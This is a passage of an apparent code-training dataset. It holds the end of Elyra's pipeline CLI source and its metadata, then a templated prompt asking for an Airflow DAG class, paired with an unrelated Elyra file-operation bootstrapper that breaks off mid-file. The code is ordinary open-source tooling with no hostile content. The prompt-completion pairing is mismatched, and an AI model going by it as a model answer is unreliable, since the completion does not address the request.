click.ClickException(f\"Invalid runtime configuration: {runtime_config_name}\\n {e}\")\n\n\ndef _get_runtime_type(runtime_config_name: Optional[str]) -> Optional[str]:\n    \"\"\"Get runtime type for the provided runtime configuration name\"\"\"\n    runtime_config = _get_runtime_config(runtime_config_name)\n    if runtime_config:\n        return runtime_config.metadata.get(\"runtime_type\")\n    return None\n\n\ndef _get_runtime_schema_name(runtime_config_name: Optional[str]) -> Optional[str]:\n    \"\"\"Get runtime schema name for the provided runtime configuration name\"\"\"\n    if not runtime_config_name:\n        # No runtime configuration was specified so treat as local.\n        # Cannot use metadata manager to determine the runtime type.\n        return \"local\"\n    runtime_config = _get_runtime_config(runtime_config_name)\n    if runtime_config:\n        return runtime_config.schema_name\n    return None\n\n\ndef _get_pipeline_runtime_type(pipeline_definition: dict) -> Optional[str]:\n    \"\"\"Return the runtime type name associated with the given pipeline\"\"\"\n    return pipeline_definition.get(\"pipelines\", [{}])[0].get(\"app_data\", {}).get(\"runtime_type\")\n\n\ndef _validate_pipeline_runtime(primary_pipeline: Pipeline, runtime: str) -> bool:\n    \"\"\"\n    Generic pipelines do not have a persisted runtime type, and can be run on any runtime\n    Runtime specific pipeline have a runtime type, and can only be run on matching runtime\n    \"\"\"\n    is_valid = True\n    if runtime:  # Only perform validation if a target runtime has been specified\n        pipeline_runtime = primary_pipeline.runtime\n        if pipeline_runtime and pipeline_runtime != runtime:\n            is_valid = False\n\n    return is_valid\n\n\ndef _preprocess_pipeline(\n    pipeline_path: str, runtime: Optional[str] = None, runtime_config: Optional[str] = None\n) -> dict:\n    pipeline_path = os.path.expanduser(pipeline_path)\n    pipeline_abs_path = os.path.join(os.getcwd(), pipeline_path)\n    pipeline_dir = os.path.dirname(pipeline_abs_path)\n    pipeline_name = os.path.splitext(os.path.basename(pipeline_abs_path))[0]\n\n    if not os.path.exists(pipeline_abs_path):\n        raise click.ClickException(f\"Pipeline file not found: '{pipeline_abs_path}'\\n\")\n\n    try:\n        pipeline_definition = PipelineDefinition(pipeline_abs_path)\n    except ValueError as ve:\n        raise click.ClickException(f\"Pipeline file is invalid: \\n {ve}\")\n\n    try:\n        primary_pipeline = pipeline_definition.primary_pipeline\n    except Exception as e:\n        raise click.ClickException(e)\n\n    try:\n        for pipeline in pipeline_definition.pipelines:\n            for node in pipeline.nodes:\n                filename = node.get_component_parameter(\"filename\")\n                if filename:\n                    abs_path = os.path.join(pipeline_dir, filename)\n                    node.set_component_parameter(\"filename\", abs_path)\n\n    except Exception as e:\n        raise click.ClickException(f\"Error pre-processing pipeline: \\n {e}\")\n\n    # update pipeline transient fields\n    primary_pipeline.set(\"name\", pipeline_name)\n    primary_pipeline.set(\"source\", os.path.basename(pipeline_abs_path))\n    # Only update the following if values were provided\n    if runtime:\n        primary_pipeline.set(\"runtime\", runtime)\n    if runtime_config:\n        primary_pipeline.set(\"runtime_config\", runtime_config)\n\n    return pipeline_definition.to_dict()\n\n\ndef _print_issues(issues):\n    # print validation issues\n\n    for issue in sorted(issues, key=itemgetter(\"severity\")):\n        severity = f\" [{SEVERITY[issue.get('severity')]}]\"\n        prefix = \"\"\n        postfix = \"\"\n        if issue.get(\"data\"):\n            if issue[\"data\"].get(\"nodeName\"):\n                # issue is associated with a single node; display it\n                prefix = f\"[{issue['data'].get('nodeName')}]\"\n            if issue[\"data\"].get(\"propertyName\"):\n                # issue is associated with a node property; display it\n                prefix = f\"{prefix}[{issue['data'].get('propertyName')}]\"\n            if issue[\"data\"].get(\"value\"):\n                # issue is caused by the value of a node property; display it\n                postfix = f\"The current property value is '{issue['data'].get('value')}'.\"\n            elif issue[\"data\"].get(\"nodeNames\") and isinstance(issue[\"data\"][\"nodeNames\"], list):\n                # issue is associated with multiple nodes\n                postfix = \"Nodes: \"\n                separator = \"\"\n                for nn in issue[\"data\"][\"nodeNames\"]:\n                    postfix = f\"{postfix}{separator}'{nn}'\"\n                    separator = \", \"\n        output = f\"{severity}{prefix} - {issue['message']} {postfix}\"\n        click.echo(output)\n\n    click.echo(\"\")\n\n\ndef _validate_pipeline_definition(pipeline_definition: PipelineDefinition):\n    \"\"\"Validate pipeline definition and display issues\"\"\"\n\n    click.echo(\"Validating pipeline...\")\n    # validate pipeline\n    validation_response = asyncio.get_event_loop().run_until_complete(\n        PipelineValidationManager.instance().validate(pipeline=pipeline_definition)\n    )\n\n    # print validation issues\n    issues = validation_response.to_json().get(\"issues\")\n    _print_issues(issues)\n\n    if validation_response.has_fatal:\n        # raise an exception and let the caller decide what to do\n        raise click.ClickException(\"Unable to continue due to pipeline validation issues.\")\n\n\ndef _execute_pipeline(pipeline_definition) -> PipelineProcessorResponse:\n    try:\n        # parse pipeline\n        pipeline_object = PipelineParser().parse(pipeline_definition)\n        # process pipeline\n        with warnings.catch_warnings():\n            warnings.simplefilter(\"ignore\")\n            response = asyncio.get_event_loop().run_until_complete(\n                PipelineProcessorManager.instance().process(pipeline_object)\n            )\n            return response\n    except ValueError as ve:\n        raise click.ClickException(f\"Error parsing pipeline: \\n {ve}\")\n    except RuntimeError as re:\n        raise click.ClickException(f\"Error processing pipeline: \\n {re} \\n {re.__cause__}\")\n\n\ndef _build_component_cache():\n    \"\"\"Initialize a ComponentCache instance and wait for it to complete all tasks\"\"\"\n    with Spinner(text=\"Initializing the component cache...\"):\n        component_cache = ComponentCache.instance(emulate_server_app=True)\n        component_cache.load()\n        component_cache.wait_for_all_cache_tasks()\n\n\ndef validate_pipeline_path(ctx, param, value):\n    \"\"\"Callback for pipeline_path parameter\"\"\"\n    if not value.is_file():\n        raise click.BadParameter(f\"'{value}' is not a file.\")\n    if value.suffix != \".pipeline\":\n        raise click.BadParameter(f\"'{value}' is not a .pipeline file.\")\n    return value\n\n\ndef print_banner(title):\n    click.echo(Fore.CYAN + \"────────────────────────────────────────────────────────────────\" + Style.RESET_ALL)\n    click.echo(f\"{Fore.CYAN} {title}{Style.RESET_ALL}\")\n    click.echo(Fore.CYAN + \"────────────────────────────────────────────────────────────────\" + Style.RESET_ALL)\n    click.echo()\n\n\ndef print_info(title, info_list):\n    click.echo(f\"{Fore.CYAN}❯ {title}{Style.RESET_ALL}\")\n    for info_item in info_list:\n        if isinstance(info_item, str):\n            click.echo(f\"  {info_item}\")\n        else:\n            click.echo(f\"  {info_item[0]}: {info_item[1]}\")\n    click.echo()\n\n\ndef print_version():\n    print_info(\"Version\", [f\"elyra {__version__}\"])\n\n\n@click.group()\n@click.version_option(__version__, message=\"v%(version)s\")\ndef pipeline():\n    \"\"\"\n    Run Elyra pipelines in your local environment or submit them to an external service,\n    such as Kubeflow Pipelines or Apache Airflow.\n\n    Find more information at: https://elyra.readthedocs.io/en/latest/\n    \"\"\"\n    pass\n\n\n@click.command()\n@click.option(\"--runtime-config\", required=False, help=\"Runtime config where the pipeline should be processed\")\n@click.argument(\"pipeline_path\", type=Path, callback=validate_pipeline_path)\ndef validate(pipeline_path: str, runtime_config: Optional[str] = None):\n    \"\"\"\n    Validate pipeline\n    \"\"\"\n    click.echo()\n\n    print_banner(\"Elyra Pipeline Validation\")\n\n    runtime = _get_runtime_schema_name(runtime_config)\n    if runtime != \"local\":\n        _build_component_cache()\n\n    pipeline_definition = _preprocess_pipeline(pipeline_path, runtime=runtime, runtime_config=runtime_config)\n    try:\n        _validate_pipeline_definition(pipeline_definition)\n    except Exception:\n        raise click.ClickException(\"Pipeline validation FAILED.\")\n\n    print_info(\"Pipeline validation SUCCEEDED.\", [])\n\n\ndef validate_timeout_option(ctx, param, value):\n    \"\"\"Callback for monitor-timeout parameter validation\"\"\"\n    try:\n        value = int(value)\n        if value <= 0:\n            raise ValueError()\n    except ValueError:\n        raise click.BadParameter(f\"'{value}' is not a positive integer.\")\n    else:\n        return value\n\n\n@click.command()\n@click.argument(\"pipeline_path\", type=Path, callback=validate_pipeline_path)\n@click.option(\"--json\", \"json_option\", is_flag=True, required=False, help=\"Display pipeline summary in JSON format\")\n@click.option(\n    \"--runtime-config\",\n    \"runtime_config_name\",\n    required=True,\n    help=\"Runtime config where the pipeline should be processed\",\n)\n@click.option(\n    \"--monitor\",\n    \"monitor_option\",\n    is_flag=True,\n    required=False,\n    help=\"Monitor the pipeline run (Supported for Kubeflow Pipelines only)\",\n)\n@click.option(\n    \"--monitor-timeout\",\n    \"timeout_option\",\n    type=int,\n    default=60,\n    show_default=True,\n    required=False,\n    help=\"Monitoring timeout in minutes.\",\n    callback=validate_timeout_option,\n)\ndef submit(json_option, pipeline_path, runtime_config_name, monitor_option, timeout_option):\n    \"\"\"\n    Submit a pipeline to be executed on the server\n    \"\"\"\n\n    click.echo()\n\n    print_banner(\"Elyra Pipeline Submission\")\n\n    runtime_config = _get_runtime_config(runtime_config_name)\n    runtime_schema = runtime_config.schema_name\n    if runtime_schema != \"local\":\n        _build_component_cache()\n\n    pipeline_definition = _preprocess_pipeline(\n        pipeline_path, runtime=runtime_schema, runtime_config=runtime_config_name\n    )\n    try:\n        _validate_pipeline_definition(pipeline_definition)\n    except Exception:\n        raise click.ClickException(\"Pipeline validation FAILED. The pipeline was not submitted for execution.\")\n\n    with Spinner(text=\"Submitting pipeline...\"):\n        response: PipelineProcessorResponse = _execute_pipeline(pipeline_definition)\n\n    if not json_option:\n        if response:\n            msg = []\n            # If there's a git_url attr, assume Apache Airflow DAG repo.\n            # TODO: this will need to be revisited once front-end is decoupled from runtime platforms.\n            if hasattr(response, \"git_url\"):\n                msg.append(f\"Apache Airflow DAG has been pushed to: {response.git_url}\")\n            msg.append(f\"Check the status of your job at: {response.run_url}\")\n            if response.object_storage_path is not None and response.object_storage_url is not None:\n                msg.append(\n                    f\"The results and outputs are in the {response.object_storage_path} \"\n                    f\"working directory in {response.object_storage_url}\"\n                )\n            print_info(\"Job submission succeeded\", msg)\n        click.echo()\n        print_banner(\"Elyra Pipeline Submission Complete\")\n    else:\n        if response:\n            click.echo()\n            print(json.dumps(response.to_json(), indent=4))\n\n    # Start pipeline run monitoring, if requested\n    if runtime_schema == \"kfp\" and monitor_option:\n        minute_str = \"minutes\" if timeout_option > 1 else \"minute\"\n        try:\n            msg = (\n                f\"Monitoring status of pipeline run '{response.run_id}' for up to \" f\"{timeout_option} {minute_str}...\"\n            )\n            with Spinner(text=msg):\n                status = _monitor_kfp_submission(runtime_config, runtime_config_name, response.run_id, timeout_option)\n        except TimeoutError:\n            click.echo(\n                \"Monitoring was stopped because the timeout threshold \"\n                f\"({timeout_option} {minute_str}) was exceeded. The pipeline is still running.\"\n            )\n            sys.exit(EXIT_TIMEDOUT)\n        else:\n            # The following are known KFP states: 'succeeded', 'failed', 'skipped',\n            # 'error'. Treat 'unknown' as error. Exit with appropriate status code.\n            click.echo(f\"Monitoring ended with run status: {status}\")\n            if status.lower() not in [\"succeeded\", \"skipped\"]:\n                # Click appears to use non-zero exit codes 1 (ClickException)\n                # and 2 (UsageError). Terminate.\n                sys.exit(click.ClickException.exit_code)\n\n\ndef _monitor_kfp_submission(runtime_config: dict, runtime_config_name: str, run_id: str, timeout: int) -> str:\n    \"\"\"Monitor the status of a Kubeflow Pipelines run\"\"\"\n\n    try:\n        # Authenticate with the KFP server\n        auth_info = KFPAuthenticator().authenticate(\n            runtime_config.metadata[\"api_endpoint\"].rstrip(\"/\"),\n            auth_type_str=runtime_config.metadata.get(\"auth_type\"),\n            runtime_config_name=runtime_config_name,\n            auth_parm_1=runtime_config.metadata.get(\"api_username\"),\n            auth_parm_2=runtime_config.metadata.get(\"api_password\"),\n        )\n    except AuthenticationError as ae:\n        if ae.get_request_history() is not None:\n            click.echo(\"An authentication error was raised. Diagnostic information follows.\")\n            click.echo(ae.request_history_to_string())\n        raise click.ClickException(f\"Kubeflow authentication failed: {ae}\")\n\n    try:\n        # Create a Kubeflow Pipelines client. There is no need to use a Tekton client,\n        # because the monitoring API is agnostic.\n        client = ArgoClient(\n            host=runtime_config.metadata[\"api_endpoint\"].rstrip(\"/\"),\n            cookies=auth_info.get(\"cookies\", None),\n            credentials=auth_info.get(\"credentials\", None),\n            existing_token=auth_info.get(\"existing_token\", None),\n            namespace=runtime_config.metadata.get(\"user_namespace\"),\n        )\n        # wait for the run to complete or timeout (API uses seconds as unit - convert)\n        run_details = client.wait_for_run_completion(run_id, timeout * 60)\n    except TimeoutError:\n        # pipeline processing did not finish yet, stop monitoring\n        raise\n    except Exception as ex:\n        # log error and return 'unknown' status\n        click.echo(f\"Monitoring failed: {type(ex)}: {ex}\")\n        return \"unknown\"\n    else:\n        return run_details.run.status\n\n\n@click.command()\n@click.option(\"--json\", \"json_option\", is_flag=True, required=False, help=\"Display pipeline summary in JSON format\")\n@click.argument(\"pipeline_path\", type=Path, callback=validate_pipeline_path)\ndef run(json_option, pipeline_path):\n    \"\"\"\n    Run a pipeline in your local environment\n    \"\"\"\n    click.echo()\n\n    print_banner(\"Elyra Pipeline Local Run\")\n\n    pipeline_definition = _preprocess_pipeline(pipeline_path, runtime=\"local\")\n\n    try:\n        _validate_pipeline_definition(pipeline_definition)\n    except Exception:\n        raise click.ClickException(\"Pipeline validation FAILED. The pipeline was not run.\")\n\n    response = _execute_pipeline(pipeline_definition)\n\n    if not json_option:\n        click.echo()\n        print_banner(\"Elyra Pipeline Local Run Complete\")\n    else:\n        click.echo()\n        if response:\n            print(json.dumps(response.to_json(), indent=4))\n\n\n@click.command()\n@click.option(\"--json\", \"json_option\", is_flag=True, required=False, help=\"Display pipeline summary in JSON format\")\n@click.argument(\"pipeline_path\", type=Path, callback=validate_pipeline_path)\ndef describe(json_option, pipeline_path):\n    \"\"\"\n    Display pipeline summary and dependencies.\n    \"\"\"\n\n    pipeline_definition = _preprocess_pipeline(pipeline_path, runtime=\"local\")\n\n    primary_pipeline = PipelineDefinition(pipeline_definition=pipeline_definition).primary_pipeline\n\n    # Define and populate the data structure that holds the artifacts this command will\n    # report on.\n    describe_dict = OrderedDict()\n    describe_dict[\"name\"] = {  # key is the artifact name, e.g. the pipeline name\n        \"display_name\": \"Pipeline name\",  # displayed in human-readable output\n        \"json_name\": \"name\",  # property name in machine-readable output\n        \"value\": primary_pipeline.name,  # the artifact's value\n    }\n    describe_dict[\"description\"] = {\n        \"display_name\": \"Description\",\n        \"json_name\": \"description\",\n        \"value\": primary_pipeline.get_property(\"description\"),\n    }\n    describe_dict[\"type\"] = {\n        \"display_name\": \"Pipeline type\",\n        \"json_name\": \"pipeline_type\",\n        \"value\": primary_pipeline.type,\n    }\n    describe_dict[\"version\"] = {\n        \"display_name\": \"Pipeline format version\",\n        \"json_name\": \"pipeline_format_version\",\n        \"value\": primary_pipeline.version,\n    }\n    describe_dict[\"runtime\"] = {\n        \"display_name\": \"Pipeline runtime\",\n        \"json_name\": \"pipeline_runtime\",\n        \"value\": primary_pipeline.get_property(\"runtime\"),\n    }\n    describe_dict[\"generic_node_count\"] = {\n        \"display_name\": \"Number of generic nodes\",\n        \"json_name\": \"generic_node_count\",\n        \"value\": 0,\n    }\n    describe_dict[\"custom_node_count\"] = {\n        \"display_name\": \"Number of custom nodes\",\n        \"json_name\": \"custom_node_count\",\n        \"value\": 0,\n    }\n    describe_dict[\"script_dependencies\"] = {\n        \"display_name\": \"Script dependencies\",\n        \"json_name\": \"scripts\",\n        \"value\": set(),\n    }\n    describe_dict[\"notebook_dependencies\"] = {\n        \"display_name\": \"Notebook dependencies\",\n        \"json_name\": \"notebooks\",\n        \"value\": set(),\n    }\n    describe_dict[\"file_dependencies\"] = {\n        \"display_name\": \"Local file dependencies\",\n        \"json_name\": \"files\",\n        \"value\": set(),\n    }\n    describe_dict[\"component_dependencies\"] = {\n        \"display_name\": \"Component dependencies\",\n        \"json_name\": \"custom_components\",\n        \"value\": set(),\n    }\n    describe_dict[\"volume_dependencies\"] = {\n        \"display_name\": \"Volume dependencies\",\n        \"json_name\": \"volumes\",\n        \"value\": set(),\n    }\n    describe_dict[\"container_image_dependencies\"] = {\n        \"display_name\": \"Container image dependencies\",\n        \"json_name\": \"container_images\",\n        \"value\": set(),\n    }\n    describe_dict[\"kubernetes_secret_dependencies\"] = {\n        \"display_name\": \"Kubernetes secret dependencies\",\n        \"json_name\": \"kubernetes_secrets\",\n        \"value\": set(),\n    }\n\n    # iterate through pipeline nodes and update the describe_dict values\n    for node in primary_pipeline.nodes:\n        # update describe_dict stats that take into account every operation\n        # (... there are none today)\n        # volumes\n        for vm in node.get_component_parameter(pipeline_constants.MOUNTED_VOLUMES, []):\n            # The below is a workaround until https://github.com/elyra-ai/elyra/issues/2919 is fixed\n            if not isinstance(vm, (VolumeMount, dict)):\n                continue\n            pvc_name = vm.pvc_name if isinstance(vm, VolumeMount) else vm.get(\"pvc_name\")\n            describe_dict[\"volume_dependencies\"][\"value\"].add(pvc_name)\n\n        if Operation.is_generic_operation(node.op):\n            # update stats that are specific to generic components\n            describe_dict[\"generic_node_count\"][\"value\"] = describe_dict[\"generic_node_count\"][\"value\"] + 1\n            file_name = node.get_component_parameter(\"filename\")\n            if file_name:\n                # Add notebook or script as dependency, if one was configured\n                if Path(file_name).suffix == \".ipynb\":\n                    describe_dict[\"notebook_dependencies\"][\"value\"].add(file_name)\n                else:\n                    describe_dict[\"script_dependencies\"][\"value\"].add(file_name)\n\n            # local files (or directories)\n            for fd in node.get_component_parameter(\"dependencies\", []):\n                describe_dict[\"file_dependencies\"][\"value\"].add(fd)\n\n            # container image, if one was configured\n            if node.get_component_parameter(pipeline_constants.RUNTIME_IMAGE):\n                describe_dict[\"container_image_dependencies\"][\"value\"].add(\n                    node.get_component_parameter(pipeline_constants.RUNTIME_IMAGE)\n                )\n\n            # Kubernetes secrets\n            for ks in node.get_component_parameter(pipeline_constants.KUBERNETES_SECRETS, []):\n                describe_dict[\"kubernetes_secret_dependencies\"][\"value\"].add(ks.name)\n        else:\n            # update stats that are specific to custom components\n            describe_dict[\"custom_node_count\"][\"value\"] = describe_dict[\"custom_node_count\"][\"value\"] + 1\n            # component dependencies\n            describe_dict[\"component_dependencies\"][\"value\"].add(node.component_source)\n            for value in node.get_all_component_parameters().values():\n                if isinstance(value, dict) and value.get(\"widget\", \"\") == \"file\":\n                    describe_dict[\"file_dependencies\"][\"value\"].add(value.get(\"value\"))\n\n    #\n    # produce output in the requested human-readable or machine-readable format\n    #\n    indent_length = 4\n\n    if json_option:\n        # produce machine-readable output\n        output_dict = {\n            describe_dict[\"name\"][\"json_name\"]: describe_dict[\"name\"][\"value\"],\n            describe_dict[\"description\"][\"json_name\"]: describe_dict[\"description\"][\"value\"],\n            describe_dict[\"type\"][\"json_name\"]: describe_dict[\"type\"][\"value\"],\n            describe_dict[\"version\"][\"json_name\"]: describe_dict[\"version\"][\"value\"],\n            describe_dict[\"runtime\"][\"json_name\"]: describe_dict[\"runtime\"][\"value\"],\n            describe_dict[\"generic_node_count\"][\"json_name\"]: describe_dict[\"generic_node_count\"][\"value\"],\n            describe_dict[\"custom_node_count\"][\"json_name\"]: describe_dict[\"custom_node_count\"][\"value\"],\n            \"dependencies\": {\n                describe_dict[\"script_dependencies\"][\"json_name\"]: list(describe_dict[\"script_dependencies\"][\"value\"]),\n                describe_dict[\"notebook_dependencies\"][\"json_name\"]: list(\n                    describe_dict[\"notebook_dependencies\"][\"value\"]\n                ),\n                describe_dict[\"file_dependencies\"][\"json_name\"]: list(describe_dict[\"file_dependencies\"][\"value\"]),\n                describe_dict[\"component_dependencies\"][\"json_name\"]: [],\n                describe_dict[\"container_image_dependencies\"][\"json_name\"]: list(\n                    describe_dict[\"container_image_dependencies\"][\"value\"]\n                ),\n                describe_dict[\"volume_dependencies\"][\"json_name\"]: list(describe_dict[\"volume_dependencies\"][\"value\"]),\n                describe_dict[\"kubernetes_secret_dependencies\"][\"json_name\"]: list(\n                    describe_dict[\"kubernetes_secret_dependencies\"][\"value\"]\n                ),\n            },\n        }\n\n        for component_dependency in describe_dict[\"component_dependencies\"][\"value\"]:\n            output_dict[\"dependencies\"][describe_dict[\"component_dependencies\"][\"json_name\"]].append(\n                json.loads(component_dependency)\n            )\n\n        click.echo(json.dumps(output_dict, indent=indent_length))\n    else:\n        # produce human-readable output\n        click.echo()\n        print_banner(\"Elyra Pipeline details\")\n\n        for v in describe_dict.values():\n            if v[\"value\"] or v[\"value\"] == 0:\n                if isinstance(v[\"value\"], set):\n                    click.echo(f'{v[\"display_name\"]}:')\n                    for item in v[\"value\"]:\n                        click.echo(f\"{' ' * indent_length}- {item}\")\n                else:\n                    click.echo(f'{v[\"display_name\"]}: {v[\"value\"]}')\n            else:\n                click.echo(f'{v[\"display_name\"]}: None specified')\n\n\n@click.command()\n@click.argument(\"pipeline_path\", type=Path, callback=validate_pipeline_path)\n@click.option(\"--runtime-config\", required=True, help=\"Runtime configuration name.\")\n@click.option(\n    \"--output\",\n    required=False,\n    type=Path,\n    help=\"Exported file name (including optional path). Defaults to the current directory and the pipeline name.\",\n)\n@click.option(\n    \"--format\",\n    required=False,\n    type=str,\n    help=\"File export format.\",\n)\n@click.option(\"--overwrite\", is_flag=True, help=\"Overwrite output file if it already exists.\")\ndef export(pipeline_path, runtime_config, output, format, overwrite):\n    \"\"\"\n    Export a pipeline to a runtime-specific format\n    \"\"\"\n\n    click.echo()\n    print_banner(\"Elyra pipeline export\")\n\n    rtc = _get_runtime_config(runtime_config)\n    runtime_type = rtc.metadata.get(\"runtime_type\")\n    runtime_schema = rtc.schema_name\n    if runtime_schema != \"local\":\n        _build_component_cache()\n\n    pipeline_definition = _preprocess_pipeline(pipeline_path, runtime=runtime_schema, runtime_config=runtime_config)\n\n    # Verify that the pipeline's runtime type is compatible with the\n    # runtime configuration\n    pipeline_runtime_type = _get_pipeline_runtime_type(pipeline_definition)\n    if pipeline_runtime_type and pipeline_runtime_type != \"Generic\" and pipeline_runtime_type != runtime_type:\n        raise click.BadParameter(\n            f\"The runtime configuration type '{runtime_type}' does not match \"\n            f\"the pipeline's runtime type '{pipeline_runtime_type}'.\",\n            param_hint=\"--runtime-config\",\n        )\n\n    # Determine which export format(s) the runtime processor supports\n    resources = RuntimeTypeResources.get_instance_by_type(RuntimeProcessorType.get_instance_by_name(runtime_type))\n    supported_export_formats = resources.get_export_extensions()\n    if len(supported_export_formats) == 0:\n        raise click.ClickException(f\"Runtime type '{runtime_type}' does not support export.\")\n\n    # Verify that the user selected a valid format. If none was specified,\n    # the first from the supported list is selected as default.\n    selected_export_format = (format or supported_export_formats[0]).lower()\n    if selected_export_format not in supported_export_formats:\n        raise click.BadParameter(\n            f\"Valid export formats are {supported_export_formats}.\",\n            param_hint=\"--format\",\n        )\n    selected_export_format_suffix = f\".{selected_export_format}\"\n\n    # generate output file name from the user-provided input\n    if output is None:\n        # user did not specify an output; use current directory\n        # and derive the file name from the pipeline file name\n        output_path = Path.cwd()\n        filename = f\"{Path(pipeline_path).stem}{selected_export_format_suffix}\"\n    else:\n        if output.suffix == selected_export_format_suffix:\n            # user provided a file name\n            output_path = output.parent\n            filename = output.name\n        else:\n            # user provided a directory\n            output_path = output\n            filename = f\"{Path(pipeline_path).stem}{selected_export_format_suffix}\"\n    output_file = output_path.resolve() / filename\n\n    # verify that the output path meets the prerequisites\n    if not output_file.parent.is_dir():\n        try:\n            output_file.parent.mkdir(parents=True, exist_ok=True)\n        except Exception as ex:\n            raise click.BadParameter(f\"Cannot create output directory: {ex}\", param_hint=\"--output\")\n\n    # handle output overwrite\n    if output_file.exists() and not overwrite:\n        raise click.ClickException(\n            f\"Output file '{str(output_file)}' exists and \" \"option '--overwrite' was not specified.\"\n        )\n\n    # validate the pipeline\n    try:\n        _validate_pipeline_definition(pipeline_definition)\n    except Exception:\n        raise click.ClickException(\"Pipeline validation FAILED. The pipeline was not exported.\")\n\n    with Spinner(text=\"Exporting pipeline ...\"):\n        try:\n            # parse pipeline\n            pipeline_object = PipelineParser().parse(pipeline_definition)\n            # process pipeline\n            with warnings.catch_warnings():\n                warnings.simplefilter(\"ignore\")\n                asyncio.get_event_loop().run_until_complete(\n                    PipelineProcessorManager.instance().export(\n                        pipeline_object, selected_export_format, str(output_file), True\n                    )\n                )\n        except ValueError as ve:\n            raise click.ClickException(f\"Error parsing pipeline: \\n {ve}\")\n        except RuntimeError as re:\n            raise click.ClickException(f\"Error exporting pipeline: \\n {re} \\n {re.__cause__}\")\n\n    click.echo(f\"Pipeline was exported to '{str(output_file)}'.\")\n\n\npipeline.add_command(describe)\npipeline.add_command(validate)\npipeline.add_command(submit)\npipeline.add_command(run)\npipeline.add_command(export)\n", "metadata": {"source": "github.com/elyra-ai/elyra", "file_path": "elyra/cli/pipeline_app.py", "language": "python", "complexity": "complex", "star_count": 1942, "quality_score": 0.78, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#\n# Copyright 2018-2025 Elyra Authors\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\nfrom abc import ABC\nfrom abc import abstractmethod\nimport glob\nimport json\nimport logging\nimport os\nfrom pathlib import Path\nimport subprocess\nimport sys\nfrom tempfile import TemporaryFile\nimport time\nfrom typing import Any\nfrom typing import Dict\nfrom typing import Optional\nfrom typing import Type\nfrom typing import TypeVar\nfrom urllib.parse import urljoin\nfrom urllib.parse import urlparse\nfrom urllib.parse import urlunparse\n\nfrom packaging import version\n\n\n# Inputs and Outputs separator character.  If updated,\n# same-named variable in _notebook_op.py must be updated!\nINOUT_SEPARATOR = \";\"\n\n# Setup forward reference for type hint on return from class factory method.  See\n# https://stackoverflow.com/questions/39205527/can-you-annotate-return-type-when-value-is-instance-of-cls/39205612#39205612\nF = TypeVar(\"F\", bound=\"FileOpBase\")\n\nlogger = logging.getLogger(\"elyra\")\nenable_pipeline_info = os.getenv(\"ELYRA_ENABLE_PIPELINE_INFO\", \"true\").lower() == \"true\"\n# not only log File Operations output of NotebookFileOp, RFileOp, PythonFileOp to stdout so it appears\n# in runtime / container logs and also Airflow and KFP GUI logs, but also put output to S3 storage\nenable_generic_node_script_output_to_s3 = (\n    os.getenv(\"ELYRA_GENERIC_NODES_ENABLE_SCRIPT_OUTPUT_TO_S3\", \"true\").lower() == \"true\"\n)\npipeline_name = None  # global used in formatted logging\noperation_name = None  # global used in formatted logging\n\n\nclass FileOpBase(ABC):\n    \"\"\"Abstract base class for file-based operations\"\"\"\n\n    filepath = None\n    cos_client = None\n    cos_bucket = None\n\n    @classmethod\n    def get_instance(cls: Type[F], **kwargs: Any) -> F:\n        \"\"\"Creates an appropriate subclass instance based on the extension of the filepath (-f) argument\"\"\"\n        filepath = kwargs[\"filepath\"]\n        if \".ipynb\" in filepath:\n            return NotebookFileOp(**kwargs)\n        elif \".py\" in filepath:\n            return PythonFileOp(**kwargs)\n        elif \".r\" in filepath:\n            return RFileOp(**kwargs)\n        else:\n            raise ValueError(f\"Unsupported file type: {filepath}\")\n\n    def __init__(self, **kwargs: Any) -> None:\n        \"\"\"Initializes the FileOpBase instance\"\"\"\n        import minio\n        from minio.credentials import providers\n\n        self.filepath = kwargs[\"filepath\"]\n        self.input_params = kwargs or {}\n        self.cos_endpoint = urlparse(self.input_params.get(\"cos-endpoint\"))\n        self.cos_bucket = self.input_params.get(\"cos-bucket\")\n\n        self.parameter_pass_method = self.input_params.get(\"parameter_pass_method\")\n        self.pipeline_param_dict = self.convert_param_str_to_dict(self.input_params.get(\"pipeline_parameters\"))\n\n        # Infer secure from the endpoint's scheme.\n        self.secure = self.cos_endpoint.scheme == \"https\"\n\n        # get minio credentials provider\n        if \"cos-user\" in self.input_params and \"cos-password\" in self.input_params:\n            cred_provider = providers.StaticProvider(\n                access_key=self.input_params.get(\"cos-user\"),\n                secret_key=self.input_params.get(\"cos-password\"),\n            )\n        elif \"AWS_ACCESS_KEY_ID\" in os.environ and \"AWS_SECRET_ACCESS_KEY\" in os.environ:\n            cred_provider = providers.EnvAWSProvider()\n        elif \"AWS_ROLE_ARN\" in os.environ and \"AWS_WEB_IDENTITY_TOKEN_FILE\" in os.environ:\n            cred_provider = providers.IamAwsProvider()\n        else:\n            raise RuntimeError(\n                \"No minio credentials provider can be initialised for current configs. \"\n                \"Please validate your runtime configuration details and retry.\"\n            )\n\n        # get minio client\n        self.cos_client = minio.Minio(self.cos_endpoint.netloc, secure=self.secure, credentials=cred_provider)\n\n    @abstractmethod\n    def execute(self) -> None:\n        \"\"\"Execute the operation relative to derived class\"\"\"\n        raise NotImplementedError(\"Method 'execute()' must be implemented by subclasses!\")\n\n    def process_dependencies(self) -> None:\n        \"\"\"Process dependencies\n\n        If a dependency archive is present, it will be downloaded from object storage\n        and expanded into the local directory.\n\n        This method can be overridden by subclasses, although overrides should first\n        call the superclass method.\n        \"\"\"\n        OpUtil.log_operation_info(\"processing dependencies\")\n        t0 = time.time()\n        archive_file = self.input_params.get(\"cos-dependencies-archive\")\n\n        self.get_file_from_object_storage(archive_file)\n\n        inputs = self.input_params.get(\"inputs\")\n        if inputs:\n            input_list = inputs.split(INOUT_SEPARATOR)\n            for file in input_list:\n                self.get_file_from_object_storage(file.strip())\n\n        subprocess.call([\"tar\", \"-zxvf\", archive_file])\n        duration = time.time() - t0\n        OpUtil.log_operation_info(\"dependencies 